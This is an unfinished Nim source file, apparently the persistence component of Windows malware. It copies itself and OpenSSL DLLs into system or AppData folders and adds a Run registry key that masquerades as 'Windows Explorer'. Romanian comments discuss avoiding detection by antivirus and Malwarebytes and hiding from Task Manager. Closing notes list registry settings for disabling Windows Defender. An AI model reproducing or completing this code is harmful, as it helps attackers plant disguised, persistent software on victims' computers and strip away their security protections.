## TODO: FINISH THIS

from os import getAppFilename
from os import copyFile
from os import getEnv
from os import `/`
from os import existsFile

import ../functions/setRegKey
import ../functions/delRegKey
import ../functions/isAdmin

from ../constants import EXE_NAME

proc initPersistenceThread*(): void {.thread.} =
  let exeName: string = EXE_NAME
  let filename: string = getAppFilename()
  var dest: string

  if isAdmin():
    # ma detecteaza antivirusul la windows ca svchost e
    # scris cu chiril si seamana cu cv fisier windows
    # trebuie sa vad sa gasesc alt nume credibil
    dest = getEnv("SystemRoot")
  else:
    # ma detecteaza mallwarebytes daca stau in appdata
    dest = getEnv("appdata") / "Microsoft\\Windows"

  let appDest: string = dest / exeName
  # imi da crash programul daca incerc sa i dau replace dar el e deschis
  # not existsFile dest ca sa nu l instalez de 2 ori
  if filename != appDest or not existsFile appDest:
    copyFile(filename, appDest)

    let ddl1Name: string = "libssl-1_1.dll"
    copyFile(ddl1Name, dest / ddl1Name)

    let ddl2Name: string = "libcrypto-1_1.dll"
    copyFile(ddl2Name, dest / ddl2Name)
    ## TODO: trebuie sa fac un sistem sa pacalesc taskmanagerul si sa se deschida oricand are el chef
    ## probabil pot daca sterg keyul il pun inapoi si fac asa de fiecare data cand se deschide
    setRegKey(
       "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
       "Windows Explorer", appDest
    )
  # setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  #     "client bl2", dest)
  # delRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  #     "client bla")


  ## INTERESANT: REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
  ## vezi ca trb sa aiba val 1
  ## https://www.windowscentral.com/how-permanently-disable-windows-defender-antivirus-windows-10
  ## cred ca creez cv key Real-Time Protection folder 1
  ##  -> DisableBehaviorMonitoring DWORD 1
  ##  -> DisableOnAccessProtection  DWORD 1
  ##  -> DisableScanOnRealtimeEnable DWORD 1
  ##
